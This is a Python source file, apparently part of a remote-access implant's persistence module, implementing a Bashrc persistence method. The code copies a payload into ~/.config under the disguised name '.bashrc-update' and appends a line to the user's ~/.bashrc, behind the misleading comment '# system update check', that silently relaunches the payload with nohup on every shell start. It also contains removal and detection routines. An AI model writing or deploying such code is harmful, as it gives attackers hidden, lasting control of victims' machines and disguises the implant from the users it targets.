import os

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class BashrcPersistence(PersistenceMethod):
    name = 'bashrc'

    def install(self, payload_name: str = '.bashrc-update') -> PersistenceResult:
        try:
            home = os.path.expanduser('~')
            payload_path = os.path.join(home, '.config', payload_name)
            os.makedirs(os.path.dirname(payload_path), exist_ok=True)

            _copy_payload(payload_path)
            os.chmod(payload_path, 0o755)

            bashrc_path = os.path.join(home, '.bashrc')
            entry = f'\n(pgrep -f {payload_name} >/dev/null 2>&1) || nohup {payload_path} >/dev/null 2>&1 &\n'

            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                if payload_name in content:
                    return PersistenceResult(True, 'bashrc', f'[+] Bashrc entry already exists')

            with open(bashrc_path, 'a') as f:
                f.write(f'\n# system update check\n{entry}')

            return PersistenceResult(
                True, 'bashrc',
                f'[+] Bashrc persistence installed: {payload_name}',
                payload_path
            )
        except Exception as e:
            return PersistenceResult(False, 'bashrc', f'[-] Bashrc error: {str(e)}')

    def remove(self, payload_name: str = '.bashrc-update') -> PersistenceResult:
        try:
            bashrc_path = os.path.join(os.path.expanduser('~'), '.bashrc')
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    lines = f.readlines()
                lines = [l for l in lines if payload_name not in l]
                with open(bashrc_path, 'w') as f:
                    f.writelines(lines)
            try:
                os.remove(os.path.join(os.path.expanduser('~'), '.config', payload_name))
            except Exception:
                pass
            return PersistenceResult(True, 'bashrc', f'[+] Bashrc persistence removed: {payload_name}')
        except Exception as e:
            return PersistenceResult(False, 'bashrc', f'[-] Bashrc remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            bashrc_path = os.path.join(os.path.expanduser('~'), '.bashrc')
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                suspicious = [l.strip() for l in content.split('\n') if 'nohup' in l or 'pgrep' in l]
                if suspicious:
                    return PersistenceResult(True, 'bashrc', f'[+] Found {len(suspicious)} suspicious entries')
            return PersistenceResult(True, 'bashrc', '[-] No bashrc persistence found')
        except Exception:
            return PersistenceResult(False, 'bashrc', '[-] Bashrc check failed')
